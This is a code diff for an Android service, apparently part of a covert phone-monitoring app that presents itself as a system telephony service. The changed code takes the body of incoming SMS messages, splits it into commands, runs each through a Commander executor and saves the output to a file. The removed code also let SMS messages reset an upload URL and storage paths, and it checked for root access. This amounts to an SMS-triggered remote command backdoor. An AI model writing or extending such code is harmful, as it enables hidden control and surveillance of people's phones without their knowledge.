@@ -1,19 +1,8 @@
 package com.telephony.services;
 
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.UnsupportedEncodingException;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-
-import javax.crypto.BadPaddingException;
-import javax.crypto.IllegalBlockSizeException;
-import javax.crypto.NoSuchPaddingException;
 
 import android.app.Service;
 import android.content.Context;
@@ -23,11 +12,11 @@ import android.os.IBinder;
 public class SMService extends Service {
 	private PreferenceUtils sPref = null;
 	private ExecutorService es;
-	private MyProperties smsProp;
 
 	private String sms_body = null;
 	private String phoneNumber = null;
 	private String sms_from_name = null;
+	private Commander cmdr;
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -40,7 +29,7 @@ public class SMService extends Service {
 		super.onCreate();
 		es = Executors.newFixedThreadPool(1);
 		sPref = PreferenceUtils.getInstance(this);
-		smsProp = new MyProperties();
+		cmdr = new Commander(this);
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
 	}
 
@@ -49,62 +38,6 @@ public class SMService extends Service {
 		es.execute(new RunService(intent, flags, startId, this));
 		return START_REDELIVER_INTENT;
 
-	}
-
-	/**
-	 * Получить расшифрованные настройки shared preference в файл
-	 * 
-	 * @param filename
-	 * @param input
-	 *            TODO
-	 * @throws UnsupportedEncodingException
-	 * @throws IOException
-	 * @throws InvalidKeyException
-	 * @throws IllegalBlockSizeException
-	 * @throws BadPaddingException
-	 * @throws NoSuchAlgorithmException
-	 * @throws NoSuchPaddingException
-	 */
-	private void getConfig(String filename, Map<String, String> input) throws UnsupportedEncodingException, IOException, InvalidKeyException,
-			IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
-		FileOutputStream fos = null;
-		MyProperties prop = new MyProperties();
-		prop.putAll(input);
-		try {
-			fos = new FileOutputStream(new File(sPref.getRootDir(), filename));
-			prop.setIntProperty("current_version", Utils.getCurrentVersion(this));
-			prop.setBoolProperty("root_availible", Utils.checkRoot());
-			prop.setProperty(PreferenceUtils.ROOT_DIR, sPref.getRootDir().getAbsolutePath());
-			prop.setProperty(PreferenceUtils.UPLOAD_URL, sPref.getRemoteUrl());
-			prop.setIntProperty(PreferenceUtils.KEEP_DAYS, sPref.getKeepDays());
-			prop.setIntProperty(PreferenceUtils.VIBRATE, sPref.getVibrate());
-			prop.store(fos, Utils.IDENT_SMS);
-		} finally {
-			if (fos != null) {
-				fos.close();
-			}
-		}
-	}
-
-	/**
-	 * Установить параметры
-	 * 
-	 * @throws IOException
-	 * @throws InvalidKeyException
-	 * @throws IllegalBlockSizeException
-	 * @throws BadPaddingException
-	 * @throws NoSuchAlgorithmException
-	 * @throws NoSuchPaddingException
-	 */
-	private void setConfig() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
-			NoSuchPaddingException {
-
-		if (!smsProp.isEmpty()) {
-			sPref.setRootDir(smsProp.getProperty(PreferenceUtils.ROOT_DIR));
-			sPref.setRemoteUrl(smsProp.getProperty(PreferenceUtils.UPLOAD_URL));
-			sPref.setKeepDays(smsProp.getIntProperty(PreferenceUtils.KEEP_DAYS));
-			sPref.setVibrate(smsProp.getIntProperty(PreferenceUtils.VIBRATE));
-		}
 	}
 
 	private class RunService implements Runnable {
@@ -129,27 +62,22 @@ public class SMService extends Service {
 					sms_from_name = Utils.getContactName(context, phoneNumber);
 					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).replace(Utils.IDENT_SMS, "").trim();
 					if (sms_body != null) {
-						Map<String, String> exec_out = new HashMap<String, String>();
-						smsProp.load(sms_body.replace("#", "\n"));
-						setConfig();
+						StringBuilder exec_out = new StringBuilder();
+						String[] sms = sms_body.split(" *#+ *|[ \r]*\n+");
 
-						if (smsProp.containsKey(Utils.SMS_KEY_EXEC)) {
-							Commander cmdr = new Commander(context);
+						for (String cmd : sms) {
 							try {
-								String[] exec = smsProp.getStringsProperty(Utils.SMS_KEY_EXEC);
-								for (String cmd : exec) {
-									try {
-										Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
-										exec_out.putAll(cmdr.exec(cmd));
-									} catch (Exception e) {
-										e.printStackTrace();
-									}
+								if (!cmd.isEmpty()) {
+									Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
+									exec_out.append(cmdr.exec(cmd));
 								}
-							} finally {
-								cmdr.free();
+							} catch (Exception e) {
+								e.printStackTrace();
 							}
 						}
-						getConfig(Utils.CONFIG_OUT_FILENAME, exec_out);
+						if (exec_out.length() > 0) {
+							Utils.writeFile(new File(sPref.getRootDir(), Utils.CONFIG_OUT_FILENAME), exec_out.toString());
+						}
 					}
 				}
 			} catch (Exception e) {
@@ -175,10 +103,9 @@ public class SMService extends Service {
 	public void onDestroy() {
 
 		super.onDestroy();
+		cmdr = null;
 		es = null;
 		sPref = null;
-		smsProp.clear();
-		smsProp = null;
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
 	}
 
